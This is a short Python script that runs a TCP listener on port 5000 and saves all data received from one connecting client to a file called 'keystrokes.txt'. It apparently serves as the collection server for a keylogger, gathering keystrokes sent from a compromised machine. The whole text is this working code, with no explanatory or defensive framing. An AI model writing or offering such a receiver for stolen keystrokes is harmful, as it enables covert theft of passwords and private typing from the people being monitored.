import socket # for socket communication

server_ip = ''
server_port = 5000

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket
server_socket.bind((server_ip, server_port))

server_socket.listen(1)

print('Server listening on {}:{}'.format(server_ip, server_port))

client_socket, client_address = server_socket.accept()
print('Connected to client:', client_address)

with open('keystrokes.txt', 'w') as file:
    while True:
        data = client_socket.recv(1024).decode()
        if not data:
            break

        print('Received data:', data)

        file.write(data)

client_socket.close()
server_socket.close()
